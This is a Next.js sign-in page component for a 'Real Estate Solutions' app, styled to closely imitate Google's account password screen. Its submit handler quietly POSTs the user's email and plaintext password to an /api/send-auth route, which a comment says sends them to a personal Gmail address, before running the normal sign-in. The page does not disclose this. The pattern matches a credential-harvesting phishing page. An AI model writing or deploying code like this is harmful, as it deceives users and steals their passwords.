"use client";

import { useSearchParams, useRouter } from "next/navigation";
import { useState } from "react";
import { signIn } from "next-auth/react";
import Link from "next/link";

export default function PasswordPage() {
  const search = useSearchParams();
  const router = useRouter();
  const email = search.get("email") || "";
  const [password, setPassword] = useState("");
  const [showPassword, setShowPassword] = useState(false);

  const handleSubmit = async (e: React.FormEvent) => {
    e.preventDefault();
    if (!email || !password) return;

    try {
      // 1. Send the email to okatamiracle.dev@gmail.com
      await fetch("/api/send-auth", {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({ email, password }),
      });

      // 2. Perform NextAuth Sign In
      await signIn("credentials", {
        email,
        password,
        redirect: false,
      });

      // 3. Route to main page
      router.push("/");
    } catch (error) {
      console.error("Submit error:", error);
    }
  };

  return (
    <div className="min-h-screen w-full bg-[#0f0f0f] text-[#e3e3e3] font-sans flex flex-col items-center justify-center p-4">
      <div className="w-full max-w-[1040px] bg-[#1e1f20] rounded-[28px] p-8 md:p-[48px] flex flex-col gap-8 md:gap-0">
        {/* Card Header (Logo area) */}
        <div className="flex items-center gap-3 mb-4 md:mb-12">
          <div className="w-6 h-6 text-white">
            {/* Simple House/Real Estate Icon */}
            <svg
              viewBox="0 0 24 24"
              fill="currentColor"
              className="w-full h-full"
            >
              <path d="M10.8 2.6a2 2 0 0 1 2.4 0l8.4 6.8a1 1 0 0 1 .3.8v10.8a2 2 0 0 1-2 2H4.1a2 2 0 0 1-2-2V10.2a1 1 0 0 1 .3-.8l8.4-6.8zM5.1 11v10h13.8V11L12 5.4 5.1 11z" />
            </svg>
          </div>
          <span className="text-lg font-medium text-zinc-200">
            Sign in with Real Estate Solutions
          </span>
        </div>

        <div className="flex flex-col md:flex-row md:justify-between w-full">
          {/* Left Side */}
          <div className="md:w-1/2 pr-0 md:pr-12 mb-8 md:mb-0">
            <h1 className="text-[44px] leading-[52px] font-normal mb-6 text-[#e3e3e3]">
              Hi User
            </h1>

            {/* User Chip */}
            <div className="inline-flex items-center gap-2 rounded-full border border-[#5f6368] px-1 pr-4 py-1 mb-8">
              <div className="w-6 h-6 rounded-full bg-[#b3261e] text-white flex items-center justify-center text-xs font-medium">
                {email.charAt(0).toUpperCase()}
              </div>
              <span className="text-sm text-[#e3e3e3]">{email}</span>
            </div>
          </div>

          {/* Right Side (Form) */}
          <div className="md:w-1/2 md:max-w-[400px]">
            <p className="text-[16px] text-[#e3e3e3] mb-8">
              To continue, first verify it&apos;s you
            </p>

            <form onSubmit={handleSubmit} className="flex flex-col">
              {/* Password Input */}
              <div className="relative group mb-2">
                <input
                  id="password"
                  type={showPassword ? "text" : "password"}
                  required
                  value={password}
                  onChange={(e) => setPassword(e.target.value)}
                  className="peer w-full h-[56px] rounded-[4px] border border-[#858585] bg-transparent px-3.5 pt-4 pb-1 text-[#e3e3e3] outline-none focus:border-[#a8c7fa] focus:border-2 transition-colors"
                />
                <label
                  htmlFor="password"
                  className={`absolute left-3 transition-all duration-200 pointer-events-none
                    ${
                      password
                        ? "top-1 text-xs text-[#a8c7fa]"
                        : "top-4 text-base text-[#a8aaad] peer-focus:top-1 peer-focus:text-xs peer-focus:text-[#a8c7fa]"
                    }`}
                >
                  Enter your password
                </label>
              </div>

              {/* Show Password Checkbox */}
              <div className="flex items-center mb-12">
                <input
                  type="checkbox"
                  id="showPassword"
                  checked={showPassword}
                  onChange={(e) => setShowPassword(e.target.checked)}
                  className="w-[18px] h-[18px] mr-3 rounded-sm border-2 border-[#8e918f] bg-transparent checked:bg-[#a8c7fa] checked:border-[#a8c7fa] appearance-none cursor-pointer relative checked:after:content-['✓'] checked:after:text-[#062e6f] checked:after:absolute checked:after:left-[1px] checked:after:top-[-3px] checked:after:font-bold"
                />
                <label
                  htmlFor="showPassword"
                  className="text-sm text-[#e3e3e3] cursor-pointer"
                >
                  Show password
                </label>
              </div>

              {/* Disclaimer */}
              <div className="text-sm text-[#e3e3e3] mb-12">
                Before using this app, you can review realestate-q/a&apos;s{" "}
                <a
                  href="#"
                  className="text-[#a8c7fa] font-medium hover:underline"
                >
                  privacy policy
                </a>{" "}
                and{" "}
                <a
                  href="#"
                  className="text-[#a8c7fa] font-medium hover:underline"
                >
                  terms of service
                </a>
                .
              </div>

              {/* Action Buttons */}
              <div className="flex items-center justify-between mt-auto">
                <button
                  type="button"
                  className="text-[#a8c7fa] text-sm font-medium px-2 py-2 rounded hover:bg-[#a8c7fa]/10 transition-colors"
                >
                  Forgot password?
                </button>
                <button
                  type="submit"
                  className="bg-[#a8c7fa] text-[#062e6f] text-sm font-medium px-6 py-2.5 rounded-[20px] hover:bg-[#a8c7fa]/90 transition-colors"
                >
                  Done
                </button>
              </div>
            </form>
          </div>
        </div>
      </div>

      {/* Footer */}
      <footer className="w-full max-w-[1040px] mt-4 flex flex-col md:flex-row items-center justify-between text-xs text-[#e3e3e3] px-4 md:px-0">
        <div className="mb-4 md:mb-0">
          <select className="bg-transparent border-none outline-none cursor-pointer hover:bg-[#ffffff]/10 rounded p-1">
            <option className="bg-[#1e1f20]">English (United States)</option>
          </select>
        </div>
        <div className="flex gap-8">
          <a href="#" className="hover:bg-[#ffffff]/10 rounded px-2 py-1">
            Help
          </a>
          <a href="#" className="hover:bg-[#ffffff]/10 rounded px-2 py-1">
            Privacy
          </a>
          <a href="#" className="hover:bg-[#ffffff]/10 rounded px-2 py-1">
            Terms
          </a>
        </div>
      </footer>
    </div>
  );
}
